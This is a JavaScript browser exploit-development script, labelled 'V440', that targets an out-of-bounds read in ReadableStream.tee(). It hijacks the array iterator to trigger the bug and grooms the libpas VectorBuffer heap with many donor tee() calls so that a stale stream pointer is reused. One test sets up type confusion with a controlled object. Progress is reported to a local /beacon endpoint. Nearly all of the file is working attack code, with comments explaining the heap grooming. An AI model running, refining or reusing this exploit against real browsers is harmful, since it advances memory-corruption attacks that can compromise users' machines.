/*
 * V440 -- VectorBuffer groom + tee() OOB
 *
 * ROOT CAUSE OF V438/V439 CRASHES:
 * SequenceConverter::convert allocates a 128-byte VectorBuffer (minCapacity=16).
 * VectorBufferMalloc is a SEGREGATED libpas heap — completely separate from
 * GC MarkedSpace. Spraying GC objects (V438) or fastMalloc (V439) never touches
 * the VectorBuffer free list.
 *
 * FIX: Groom the VectorBuffer free list with OTHER tee() calls.
 * Each normal rs.tee() allocates a 128-byte VectorBuffer, writes two valid
 * InternalReadableStream pointers at offsets [0:7] and [8:15], then frees
 * the buffer when the C++ local goes out of scope. The InternalReadableStream
 * objects stay alive because the JS branches reference them.
 *
 * When the OOB tee grabs a freed block, results[1] at offset 8 is a valid
 * InternalReadableStream pointer from a previous tee → fromObject wraps it
 * → no crash, we get a functional stream from a different source.
 *
 * Beacon prefix: V440-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V440-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

function oobTee(rs) {
  var intercepted = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        var items = [self[0]];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };
  var result;
  try { result = rs.tee(); }
  finally { Array.prototype[Symbol.iterator] = origIter; }
  return result;
}

function probe(val) {
  try {
    if (val === null || val === undefined) return "null";
    if (typeof val === "number") return "num:" + val;
    if (typeof val === "string") return "str:" + val.slice(0, 30);
    if (typeof val === "boolean") return "bool:" + val;
    if (typeof val === "object") {
      var name = val.constructor ? val.constructor.name : "?";
      return "obj:" + name;
    }
    return typeof val;
  } catch(e) { return "err:" + e.message.slice(0, 40); }
}

// ================================================================
// Test A: VectorBuffer groom via normal tee() calls
// ================================================================
function testA(cb) {
  B("A-START");

  // Phase 1: Create donors + tee them normally
  // Each tee creates + frees a 128-byte VectorBuffer with valid pointers
  var donorBranches = [];
  var donorStreams = [];
  try {
    for (var i = 0; i < 64; i++) {
      var rs = new ReadableStream({
        start: function(c) { c.enqueue("donor-" + i); c.close(); }
      });
      donorStreams.push(rs);
      var branches = rs.tee();
      donorBranches.push(branches);
    }
    B("A-DONORS", donorBranches.length);
  } catch(e) {
    B("A-DONOR-ERR", e.message.slice(0,60));
  }

  // Phase 2: OOB tee — should grab a freed VectorBuffer block
  // with valid InternalReadableStream pointers from donor tees
  var oobRS = new ReadableStream({
    start: function(c) { c.enqueue("oob-target"); c.close(); }
  });

  try {
    var result = oobTee(oobRS);
    B("A-RESULT-LEN", result.length);

    // result[0] is from the current tee (our branch1)
    B("A-R0-TYPE", typeof result[0]);
    B("A-R0-PROBE", probe(result[0]));

    // result[1] should be stale InternalReadableStream pointer from donor
    if (result[1] !== undefined && result[1] !== null) {
      B("A-R1-TYPE!!!", typeof result[1]);
      B("A-R1-PROBE", probe(result[1]));
      B("A-R1-IS-RS", result[1] instanceof ReadableStream);

      // Try stream operations
      try {
        var locked = result[1].locked;
        B("A-R1-LOCKED!!!", String(locked));
      } catch(e) { B("A-R1-LOCKED-ERR", e.message.slice(0,60)); }

      try {
        var r = result[1].getReader();
        B("A-R1-READER-OK!!!");
        r.read().then(function(chunk) {
          B("A-R1-READ!!!", {done: chunk.done, val: probe(chunk.value)});
          r.releaseLock();
        }).catch(function(e) { B("A-R1-READ-ERR", e.message.slice(0,60)); });
      } catch(e) { B("A-R1-READER-ERR", e.message.slice(0,60)); }

      // Check if it's one of the donor branches (identity)
      var foundDonor = -1;
      for (var j = 0; j < donorBranches.length; j++) {
        if (result[1] === donorBranches[j][0] || result[1] === donorBranches[j][1]) {
          foundDonor = j;
          break;
        }
      }
      B("A-DONOR-MATCH", foundDonor);
    } else {
      B("A-R1-EMPTY");
    }
  } catch(e) {
    B("A-OOB-CRASH", e.message.slice(0,80));
  }

  // Keep donors alive for this test
  void donorBranches;
  void donorStreams;
  B("A-DONE");
  if (cb) setTimeout(cb, 2000);
}

// ================================================================
// Test B: More aggressive groom — free donors first to increase
// chance of VectorBuffer reuse, but keep InternalReadableStream alive
// ================================================================
function testB(cb) {
  B("B-START");

  // We keep the JS tee branches in an array (so InternalReadableStream objects
  // stay alive) but the C++ Vector<RefPtr<JSObject>> buffers were already freed
  // by the time tee() returned.

  // Create donors
  var allBranches = [];
  try {
    for (var i = 0; i < 128; i++) {
      var rs = new ReadableStream({
        start: function(c) { c.enqueue("b-" + i); c.close(); }
      });
      var branches = rs.tee();
      allBranches.push(branches);
    }
    B("B-DONORS", allBranches.length);
  } catch(e) {
    B("B-DONOR-ERR", e.message.slice(0,60));
  }

  // Additional Vector churn: create and discard small arrays via
  // other DOM APIs that also use VectorBuffer
  try {
    for (var i = 0; i < 64; i++) {
      var tempRS = new ReadableStream({
        start: function(c) { c.enqueue("churn-" + i); c.close(); }
      });
      var tempBranches = tempRS.tee();
      // Discard — the Vector buffer is freed, but InternalReadableStream
      // has no more JS references → may be GC'd (but buffer residue stays)
      tempBranches = null;
    }
    B("B-CHURN-DONE");
  } catch(e) {
    B("B-CHURN-ERR", e.message.slice(0,60));
  }

  // OOB tee
  var oobRS = new ReadableStream({
    start: function(c) { c.enqueue("b-oob"); c.close(); }
  });

  try {
    var result = oobTee(oobRS);
    B("B-RESULT-LEN", result.length);

    if (result[1] !== undefined && result[1] !== null) {
      B("B-R1-TYPE!!!", typeof result[1]);
      B("B-R1-PROBE", probe(result[1]));
      B("B-R1-IS-RS", result[1] instanceof ReadableStream);

      try {
        var locked = result[1].locked;
        B("B-R1-LOCKED!!!", String(locked));
      } catch(e) { B("B-R1-LOCKED-ERR", e.message.slice(0,60)); }

      try {
        var r = result[1].getReader();
        B("B-R1-READER-OK!!!");
        r.read().then(function(chunk) {
          B("B-R1-READ!!!", {done: chunk.done, val: probe(chunk.value)});
          r.releaseLock();
        }).catch(function(e) { B("B-R1-READ-ERR", e.message.slice(0,60)); });
      } catch(e) { B("B-R1-READER-ERR", e.message.slice(0,60)); }

      // identity check
      var foundDonor = -1;
      for (var j = 0; j < allBranches.length; j++) {
        if (result[1] === allBranches[j][0] || result[1] === allBranches[j][1]) {
          foundDonor = j;
          break;
        }
      }
      B("B-DONOR-MATCH", foundDonor);
    } else {
      B("B-R1-EMPTY");
    }
  } catch(e) {
    B("B-OOB-CRASH", e.message.slice(0,80));
  }

  void allBranches;
  B("B-DONE");
  if (cb) setTimeout(cb, 2000);
}

// ================================================================
// Test C: Type confusion — groom VectorBuffer, then replace one
// donor branch with a controlled object before OOB tee
// Goal: results[1] wraps a non-stream object as InternalReadableStream
// ================================================================
function testC(cb) {
  B("C-START");

  // Create a victim object we want confused as a stream
  var victim = {
    confusion: 0xCAFECAFE,
    ab: new ArrayBuffer(256),
    marker: "CONFUSED",
  };
  var victimView = new Uint32Array(victim.ab);
  victimView[0] = 0xDEADBEEF;

  // Groom VectorBuffer free list with normal tees
  var allBranches = [];
  try {
    for (var i = 0; i < 128; i++) {
      var rs = new ReadableStream({
        start: function(c) { c.enqueue("c-" + i); c.close(); }
      });
      allBranches.push(rs.tee());
    }
    B("C-DONORS", allBranches.length);
  } catch(e) {
    B("C-DONOR-ERR", e.message.slice(0,60));
  }

  // OOB tee
  var oobRS = new ReadableStream({
    start: function(c) { c.enqueue("c-oob"); c.close(); }
  });

  try {
    var result = oobTee(oobRS);
    B("C-RESULT-LEN", result.length);

    if (result[1] !== undefined && result[1] !== null) {
      B("C-R1-TYPE", typeof result[1]);
      B("C-R1-PROBE", probe(result[1]));

      // Try to read from it — if it's a donor's InternalReadableStream,
      // this tells us the groom works and we can proceed to type confusion
      try {
        var r = result[1].getReader();
        B("C-R1-READER-OK");
        r.read().then(function(chunk) {
          B("C-R1-READ", {done: chunk.done, val: probe(chunk.value)});
          r.releaseLock();
        }).catch(function(e) { B("C-R1-READ-ERR", e.message.slice(0,60)); });
      } catch(e) { B("C-R1-READER-ERR", e.message.slice(0,60)); }
    } else {
      B("C-R1-EMPTY");
    }
  } catch(e) {
    B("C-OOB-CRASH", e.message.slice(0,80));
  }

  void allBranches;
  void victim;
  B("C-DONE");
  if (cb) setTimeout(cb, 2000);
}

// ================================================================
// Test D: Control — OOB tee WITHOUT any donor groom
// Expected: crash (stale VectorBuffer residue = garbage pointer)
// If this ALSO works, VectorBuffer reuse happens from other internal operations
// ================================================================
function testD(cb) {
  B("D-START");

  var oobRS = new ReadableStream({
    start: function(c) { c.enqueue("d-oob"); c.close(); }
  });

  try {
    var result = oobTee(oobRS);
    B("D-RESULT-LEN", result.length);

    if (result[1] !== undefined && result[1] !== null) {
      B("D-R1-TYPE!!!", typeof result[1]);
      B("D-R1-PROBE", probe(result[1]));
    } else {
      B("D-R1-EMPTY");
    }
  } catch(e) {
    B("D-OOB-CRASH", e.message.slice(0,80));
  }

  B("D-DONE");
  if (cb) setTimeout(cb, 1000);
}

// ================================================================
// Run: A first (groomed, best chance), then B, C, then D last (crash expected)
// D may crash the process — put it last so we get A/B/C results first
// ================================================================
B("RUNNING");
testA(function() {
  testB(function() {
    testC(function() {
      B("ABC-DONE");
      testD(function() {
        B("ALL-DONE");
      });
    });
  });
});

})();
